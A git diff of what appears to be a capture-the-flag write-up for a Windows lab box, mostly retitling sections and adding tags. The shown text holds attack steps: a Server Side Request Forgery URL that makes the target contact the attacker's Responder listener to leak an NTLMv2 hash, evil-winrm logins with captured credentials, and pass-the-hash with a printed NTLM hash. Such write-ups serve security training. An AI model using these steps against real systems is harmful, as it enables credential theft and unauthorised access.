@@ -1,4 +1,4 @@
-#Pwned
+#Pwned #AD #Windows #SSRF #TokenAbuse #LateralMovement
 ```IP
 192.168.167.165
 ```
@@ -57,11 +57,11 @@ We start responder in our local machine:
 ```
 sudo responder -I tun0
 ```
-and then try to connect to our machine:
+And then we will try to connect to our machine to see if we can exploit a Server Side Request Forgery (SSRF) attack:
 ```
 http://192.168.167.165:8080/?url=http://192.168.45.246/test
 ```
-And we get a NTLMv3 hash:
+Ineed we receive a NTLMv2 hash, which verifies that the target is vulnerable to a SSRF attack:
 
 ![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219094300.png?raw=true)
 
@@ -86,7 +86,7 @@ nxc winrm 192.168.167.165 -u 'enox' -p 'california'
 
 # PrivEsc
 
-## Manual
+## Lateral Movement
 We will use evil-winrm to connect to the target machine and get remote code execution:
 ```
 evil-winrm -i 192.168.167.165 -u enox -p 'california'
@@ -104,7 +104,7 @@ However we still need to get access as Administrator. In this directory there is
 ![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219095355.png?raw=true)
 
 But they do not seem relevant.
-## Automated PE
+## Automated Tools
 ### Bloodhound
 
 After some manual enumeration we can run bloodhound:
@@ -135,6 +135,7 @@ And then run the exploit:
 ```
 C9C9F97308956B4AEDD53C1351F47A84
 ```
+
 Because svc_apache is a service account we will type a dollar sign at the end of it:
 ```bash
 evil-winrm -i 192.168.167.165 -u svc_apache$ -H C9C9F97308956B4AEDD53C1351F47A84
